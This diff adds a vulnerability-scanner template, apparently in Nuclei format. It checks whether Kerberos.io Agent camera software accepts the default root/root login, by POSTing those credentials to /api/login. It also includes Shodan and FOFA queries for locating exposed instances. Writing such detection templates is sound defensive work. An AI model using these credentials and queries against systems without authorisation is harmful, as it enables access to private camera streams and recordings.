@@ -1,0 +1,60 @@
+id: kerberos-agent-default-login
+
+info:
+  name: Kerberos.io Agent - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Kerberos.io Agent accepts the username root with the password root when the AGENT_USERNAME and AGENT_PASSWORD environment variables are not set. An attacker who logs in can watch the live camera stream, download recordings.
+  reference:
+    - https://github.com/kerberos-io/agent/blob/v3.14.3/README.md#access-the-kerberos-agent
+    - https://github.com/kerberos-io/agent/blob/v3.14.3/machinery/src/routers/http/jwt_middleware.go
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: kerberos-io
+    product: agent
+    shodan-query: http.title:"Kerberos Agent"
+    fofa-query: title="Kerberos Agent"
+  tags: kerberos-agent,kerberos-io,iot,camera,default-login,vuln
+
+variables:
+  username: "root"
+  password: "root"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>Kerberos Agent")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "json")'
+          - 'contains_all(body, "\"code\":200", "\"role\":\"admin\"", "\"username\":\"root\"", "\"expire\":")'
+        condition: and
+# digest: 4b0a00483046022100ae68623a99ecee3b13cb82e947d1963fa0bf51339f51bfce385aac757620eeb9022100aec4c6c51985a65f827f187fe7e60f3435a0030c3bbd785590f82c4b62a160bb:922c64590222798bb761d5b6d8e72950
